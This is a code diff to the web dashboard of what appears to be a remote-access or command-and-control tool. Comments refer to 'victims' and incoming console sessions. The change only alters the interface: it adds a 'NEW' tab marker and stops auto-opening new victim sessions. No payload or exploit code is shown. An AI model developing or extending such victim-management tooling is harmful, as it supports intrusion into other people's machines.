@@ -63,6 +63,7 @@ body{font:11px/1 'Menlo','Monaco','Consolas','Courier New',monospace;
 .stab:hover .se,.stab:hover .sx{color:var(--dim);border-color:var(--border)}
 .stab.editing{min-width:0}
 .stab.editing .sname{max-width:none}
+.stab .snew{font-size:9px;padding:1px 4px;border-radius:2px;background:#fce8e6;color:var(--red2);font-weight:600;flex-shrink:0}
 .stab .sedit{
   background:#fff;border:1px solid var(--blue);border-radius:2px;
   color:var(--text);font-family:inherit;font-size:11px;padding:1px 4px;outline:none;
@@ -1108,13 +1109,7 @@ function pollState(){
           seenVids.add(id);
           if (!isFirstLoad){
             vcache[id] = vcache[id] || {};
-            vcache[id].isNew = true;
-            // auto-open every new victim — console panel switches to the incoming session
-            active = id;
-            curPanel = "c";
-            document.querySelectorAll(".ptab").forEach(function(x){ x.classList.toggle("on",x.dataset.p==="c"); });
-            document.querySelectorAll(".panel").forEach(function(x){ x.classList.remove("on"); });
-            $("cpanel").classList.add("on");
+            vcache[id].isNew = true;        // NEW chip on the session tab — cleared when selected
             // flash Sessions badge
             hbdg.classList.add("flash");
             setTimeout(function(){ hbdg.classList.remove("flash"); }, 2200);
@@ -1168,6 +1163,7 @@ function pollState(){
           return '<div class="stab'+(id===active?" on":"")+'" data-id="'+id+'" draggable="true">'
             +'<span class="'+dc+'"></span>'
             +'<span class="sname">'+esc(nameOf(d,id))+'</span>'
+            +(vcache[id]&&vcache[id].isNew?'<span class="snew">NEW</span>':'')
             +'<span class="se" data-e="'+id+'">✎</span>'
             +'<span class="sx" data-x="'+id+'">✕</span>'
             +'</div>';
@@ -1217,7 +1213,11 @@ function pollState(){
             return;
           }
           var t=ev.target.closest(".stab");
-          if (t&&t.dataset.id){ active=t.dataset.id; pollState(); }
+          if (t&&t.dataset.id){
+            active=t.dataset.id;
+            if (vcache[active]) vcache[active].isNew=false;   // NEW cleared on open
+            pollState();
+          }
         };
         } // end if (!dragEl)
       }
